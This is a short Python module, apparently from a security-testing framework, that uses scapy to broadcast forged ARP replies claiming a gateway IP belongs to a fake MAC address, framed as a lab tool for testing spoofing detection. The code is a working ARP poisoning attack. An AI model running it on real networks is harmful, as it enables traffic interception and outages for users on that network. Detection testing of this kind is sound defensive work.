from core.module_base import ModuleBase
from scapy.all import ARP, send
import time


class ARPPayloadGenerator(ModuleBase):
    """
    Simulated ARP Poisoning & Gateway Spoofing Test Payload Generator.
    Emits controlled gratuitous ARP packets in laboratory environments
    to validate ARP spoofing sentinels and SOC detection alerts.
    """

    def __init__(self, session):
        super().__init__(session)
        self.options = {
            "TARGET_IP": {"value": "192.168.1.1", "required": True, "desc": "IP address to announce in ARP payload"},
            "FAKE_MAC": {"value": "00:aa:bb:cc:dd:ee", "required": True, "desc": "Simulated hardware MAC address to associate"},
            "COUNT": {"value": "3", "required": True, "desc": "Number of ARP packets to send"},
            "INTERVAL": {"value": "0.5", "required": False, "desc": "Interval in seconds between packets"},
        }

    def run(self):
        target_ip = self.options["TARGET_IP"]["value"]
        fake_mac = self.options["FAKE_MAC"]["value"]
        count = int(self.options["COUNT"]["value"])
        interval = float(self.options["INTERVAL"]["value"] or 0.5)

        print(f"[*] Emitting {count} test ARP packets: claiming {target_ip} is at {fake_mac}...")
        try:
            for i in range(1, count + 1):
                # op=2 is-at (reply)
                arp_pkt = ARP(op=2, psrc=target_ip, hwsrc=fake_mac, pdst="255.255.255.255", hwdst="ff:ff:ff:ff:ff:ff")
                send(arp_pkt, verbose=0)
                print(f"  [>] Sent test ARP is-at [{i}/{count}]: {target_ip} -> {fake_mac}")
                time.sleep(interval)
        except PermissionError:
            print("[-] Permission denied. Run ANDS with sudo.")
            return
        except KeyboardInterrupt:
            print("\n[*] ARP generation interrupted.")
            return

        print(f"[+] ARP test payload emission finished.")
